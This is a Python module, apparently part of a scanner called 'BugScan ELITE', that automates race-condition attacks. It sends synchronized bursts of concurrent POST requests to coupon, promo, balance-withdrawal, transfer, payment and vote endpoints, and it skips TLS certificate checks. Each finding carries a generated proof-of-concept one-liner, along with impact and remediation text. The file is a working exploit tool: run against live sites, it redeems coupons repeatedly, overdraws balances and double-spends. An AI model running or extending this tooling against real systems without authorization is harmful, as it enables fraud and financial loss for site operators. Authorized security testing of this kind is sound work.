"""
BugScan ELITE — Race Condition Engine
Tests for TOCTOU (Time-Of-Check Time-Of-Use) vulnerabilities:
- Coupon/promo code reuse via concurrent requests
- Gift card balance overdraft
- Vote/like manipulation
- Account credit abuse
- Duplicate transaction creation
Uses last-byte sync technique for precision timing.
"""
import re, time, logging, threading, urllib.parse, urllib.request, ssl, queue
from typing import List, Dict, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

log = logging.getLogger("elite.race")

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c

# Race condition targets — endpoints likely to have TOCTOU issues
RACE_TARGETS = [
    # Coupon/discount
    ("/coupon/apply",       "POST", "Coupon reuse"),
    ("/promo/redeem",       "POST", "Promo reuse"),
    ("/discount/apply",     "POST", "Discount reuse"),
    ("/code/apply",         "POST", "Code reuse"),
    ("/voucher/redeem",     "POST", "Voucher reuse"),
    # Points/credits
    ("/points/redeem",      "POST", "Points overdraft"),
    ("/credits/use",        "POST", "Credit overdraft"),
    ("/balance/withdraw",   "POST", "Balance overdraft"),
    # Votes/likes
    ("/vote",               "POST", "Vote manipulation"),
    ("/like",               "POST", "Like manipulation"),
    ("/upvote",             "POST", "Upvote manipulation"),
    # Registration/account
    ("/register",           "POST", "Duplicate registration"),
    ("/signup",             "POST", "Duplicate registration"),
    # Transfers
    ("/transfer",           "POST", "Double-spend"),
    ("/send",               "POST", "Double-spend"),
    ("/pay",                "POST", "Payment race"),
    # API
    ("/api/coupon/apply",   "POST", "API coupon reuse"),
    ("/api/redeem",         "POST", "API redeem race"),
    ("/api/vote",           "POST", "API vote race"),
    ("/api/like",           "POST", "API like race"),
]

CONCURRENT_REQUESTS = 20  # number of simultaneous requests
RACE_ROUNDS         = 3   # test each endpoint this many times


def _req_fast(url, method="GET", headers=None, data=None,
              timeout=8, cookies="") -> Optional[Tuple]:
    """Optimized request for race condition testing."""
    try:
        h = {
            "User-Agent":      "Mozilla/5.0",
            "Accept":          "*/*",
            "Connection":      "keep-alive",
            "Content-Type":    "application/x-www-form-urlencoded",
        }
        if cookies: h["Cookie"] = cookies
        if headers: h.update(headers)
        body = data.encode() if isinstance(data,str) else data
        req  = urllib.request.Request(url, data=body, headers=h, method=method)
        t0   = time.monotonic()
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            body_data = r.read(8192).decode("utf-8","ignore")
            elapsed   = time.monotonic() - t0
            return r.status, dict(r.headers), body_data, elapsed
    except urllib.error.HTTPError as e:
        try: return e.code, {}, e.read(1024).decode("utf-8","ignore"), 0
        except: return e.code, {}, "", 0
    except: return None


def _last_byte_sync(url, method, headers, data, cookies, n=20):
    """
    Last-byte synchronization attack:
    Send n requests, hold until all connections established,
    then release simultaneously for maximum concurrency.
    Uses threading.Barrier for synchronization.
    """
    results = []
    lock    = threading.Lock()
    barrier = threading.Barrier(n, timeout=10)
    errors  = []

    def _worker():
        try:
            barrier.wait()  # synchronize all threads
            r = _req_fast(url, method, headers, data, cookies=cookies)
            if r:
                with lock: results.append(r)
        except threading.BrokenBarrierError:
            pass
        except Exception as e:
            with lock: errors.append(str(e))

    threads = [threading.Thread(target=_worker, daemon=True) for _ in range(n)]
    for t in threads: t.start()
    for t in threads: t.join(timeout=15)

    return results, errors


def _detect_race_success(results: List[Tuple], baseline_fail: int = None) -> Dict:
    """
    Analyze concurrent request results for race condition indicators.
    Returns: {vulnerable: bool, evidence: str, success_count: int}
    """
    if not results:
        return {"vulnerable": False, "evidence": "No results"}

    statuses = [r[0] for r in results]
    bodies   = [r[2] for r in results]

    # Count success responses (200-299)
    successes = sum(1 for s in statuses if 200 <= s < 300)
    fails     = sum(1 for s in statuses if s >= 400)

    # Look for success indicators in bodies
    success_keywords = [
        "success","applied","redeemed","accepted","valid","ok",
        "confirmed","processed","credited","done","completed",
    ]
    fail_keywords = [
        "already","used","invalid","expired","limit","exceeded",
        "error","failed","denied","forbidden","once",
    ]

    body_successes = sum(1 for b in bodies if
                        any(kw in b.lower() for kw in success_keywords) and
                        not any(kw in b.lower() for kw in fail_keywords))

    # Race condition indicators:
    # 1. Multiple 200 responses when only 1 should succeed
    # 2. More body-level successes than expected
    race_detected = False
    evidence      = ""

    if successes >= 2:
        race_detected = True
        evidence = f"{successes}/{len(results)} requests returned 2xx — should be 1"

    elif body_successes >= 2:
        race_detected = True
        evidence = f"{body_successes}/{len(results)} responses indicate success"

    elif len(set(statuses)) > 2:
        # Mixed responses suggest race condition in state transitions
        evidence = f"Mixed statuses: {dict((s, statuses.count(s)) for s in set(statuses))}"

    return {
        "vulnerable":    race_detected,
        "evidence":      evidence,
        "successes":     successes,
        "body_successes":body_successes,
        "total":         len(results),
        "statuses":      dict((s, statuses.count(s)) for s in set(statuses)),
    }


def check_race_conditions(targets: List[str], endpoints: List[str],
                          session_cookies: str = "") -> List[Dict]:
    """
    Test for race conditions on state-changing endpoints.
    """
    findings = []
    tested   = set()

    for target in targets[:30]:
        base   = target.rstrip("/")
        parsed = urllib.parse.urlparse(base)

        # Test known race-prone paths
        for path, method, name in RACE_TARGETS:
            url = base + path
            if url in tested: continue

            # First check if endpoint exists
            probe = _req_fast(url, "GET" if method == "GET" else "POST",
                              data="test=1", cookies=session_cookies)
            if not probe or probe[0] in (404, 405): continue
            if probe[0] == 403 and not session_cookies: continue

            tested.add(url)

            # Build race payload
            race_data = {
                "coupon":   "RACE10",
                "code":     "RACE10",
                "promo":    "RACE10",
                "voucher":  "RACE10",
                "discount": "RACE10",
                "amount":   "100",
                "quantity": "1",
                "item_id":  "1",
                "target_id":"1",
                "post_id":  "1",
            }
            data_str = urllib.parse.urlencode(race_data)

            log.info(f"[race] testing {name} at {url}")

            # Run race condition test
            results, errs = _last_byte_sync(
                url, method, None, data_str, session_cookies,
                n=CONCURRENT_REQUESTS
            )

            if not results: continue

            analysis = _detect_race_success(results)

            if analysis["vulnerable"]:
                findings.append({
                    "type":     "race_condition",
                    "bug":      "race_condition",
                    "severity": "high",
                    "url":      url,
                    "name":     f"Race Condition: {name} at {path}",
                    "details": {
                        "description": (
                            f"Race condition detected on {url}. Sending {CONCURRENT_REQUESTS} "
                            f"simultaneous requests resulted in multiple successes, "
                            f"indicating a TOCTOU (Time-of-Check Time-of-Use) vulnerability."
                        ),
                        "evidence":    analysis["evidence"],
                        "successes":   analysis["successes"],
                        "total_sent":  CONCURRENT_REQUESTS,
                        "status_dist": analysis["statuses"],
                        "poc": (
                            f"# Install: pip install httpx\n"
                            f"# Run {CONCURRENT_REQUESTS} concurrent requests:\n"
                            f"python3 -c \"\n"
                            f"import httpx, asyncio\n"
                            f"async def race():\n"
                            f"    async with httpx.AsyncClient() as c:\n"
                            f"        reqs = [c.post('{url}', data={{'code':'RACE10'}}) for _ in range({CONCURRENT_REQUESTS})]\n"
                            f"        results = await asyncio.gather(*reqs)\n"
                            f"        print([r.status_code for r in results])\n"
                            f"asyncio.run(race())\n"
                            f"\""
                        ),
                        "impact": (
                            f"TOCTOU race condition in {name} — attacker can apply "
                            f"a coupon/discount multiple times, overdraft credits, "
                            f"or bypass single-use restrictions by racing the check."
                        ),
                        "remediation": (
                            "Implement atomic database operations (SELECT FOR UPDATE). "
                            "Use Redis locks or database-level unique constraints. "
                            "Move state checks and updates into a single transaction."
                        ),
                    },
                    "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
                })

    # Also test discovered endpoints with likely race conditions
    race_patterns = re.compile(
        r'(coupon|redeem|promo|discount|voucher|credit|vote|like|'
        r'transfer|payment|purchase|order|checkout|apply)', re.I
    )
    for ep in endpoints[:500]:
        if ep in tested: continue
        if not race_patterns.search(ep): continue
        parsed = urllib.parse.urlparse(ep)
        if not parsed.netloc: continue
        tested.add(ep)

        data_str = "code=RACE10&amount=1&item_id=1"
        results, _ = _last_byte_sync(ep, "POST", None, data_str,
                                      session_cookies, n=15)
        if not results: continue

        analysis = _detect_race_success(results)
        if analysis["vulnerable"]:
            findings.append({
                "type":     "race_condition",
                "bug":      "race_condition",
                "severity": "high",
                "url":      ep,
                "name":     f"Race Condition: {ep.split('/')[-1]}",
                "details": {
                    "description": f"Race condition on {ep}: {analysis['evidence']}",
                    "evidence":    analysis["evidence"],
                    "poc":         f"Send {CONCURRENT_REQUESTS} simultaneous POST requests to {ep}",
                    "impact":      "State manipulation via concurrent request race condition.",
                    "remediation": "Use atomic transactions and distributed locks for all state-changing operations.",
                },
                "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
            })

    log.info(f"[race] complete: {len(findings)} findings from {len(tested)} endpoints tested")
    return findings
